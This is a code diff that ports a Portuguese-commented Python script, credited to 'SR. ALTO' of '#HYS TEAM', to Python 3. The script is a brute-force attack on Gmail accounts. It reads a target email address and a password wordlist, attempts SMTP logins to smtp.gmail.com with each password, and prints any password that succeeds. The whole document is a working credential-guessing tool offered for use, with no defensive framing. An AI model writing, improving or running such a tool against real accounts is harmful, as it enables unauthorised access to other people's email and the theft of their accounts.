@@ -1,34 +1,50 @@
 #!/usr/bin/python
+
 import smtplib
-print("""
+
+def abrir_arquivo_senhas(senhas_arquivo):
+    with open(senhas_arquivo, "r") as senhas:
+        senhas = senhas.readlines()
+    return senhas
+
+def main():
+    # Exibe um cabeçalho informativo
+    print("""
 +++++++++++++++++++++++++++++
 + SCRIPT FEITO POR SR. ALTO +
-+                           +
-+    SALVE #HYS TEAM        +
-+                           +
-+      Versao 1.0           +
-+                           +
++              +
++   SALVE #HYS TEAM    +
++              +
++   Versao 1.0      +
++              +
 + https://github.com/SrAlto +
 +++++++++++++++++++++++++++++
-                                                                                                                                                                                           
+                                                                                              
 """)
-smtps = smtplib.SMTP("smtp.gmail.com", 587)
-smtps.ehlo()
-smtps.starttls()
 
-user = raw_input("Digite o email: ")
-senha = raw_input("Digite o caminho da Wordilist: ")
-senha = open(senha, "r")
+    # Obtém as credenciais de e-mail do usuário
+    email = input("Digite o email: ")
+    senhas_arquivo = input("Digite o caminho da Wordilist: ")
 
-headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+    # Abre o arquivo de senhas
+    senhas = abrir_arquivo_senhas(senhas_arquivo)
 
+    # Itera sobre cada senha no arquivo
+    for senha in senhas:
+        # Tenta fazer login com a senha
+        try:
+            smtp = smtplib.SMTP("smtp.gmail.com", 587)
+            smtp.ehlo()
+            smtp.starttls()
+            smtp.login(email, senha)
 
-for password in senha:
-    try:
-        smtps.login(user, password)
-        print("Senha: %s" % password)
-        break;
-    except smtplib.SMTPAuthenticationError:
-        print("Falhou")        
-        
+            # Exibe a senha se o login for bem-sucedido
+            print("Senha: %s" % senha)
+            break
+        except smtplib.SMTPAuthenticationError:
+            # Exibe uma mensagem de erro se o login falhar
+            print("Falhou")
 
+if __name__ == "__main__":
+    main()
+  
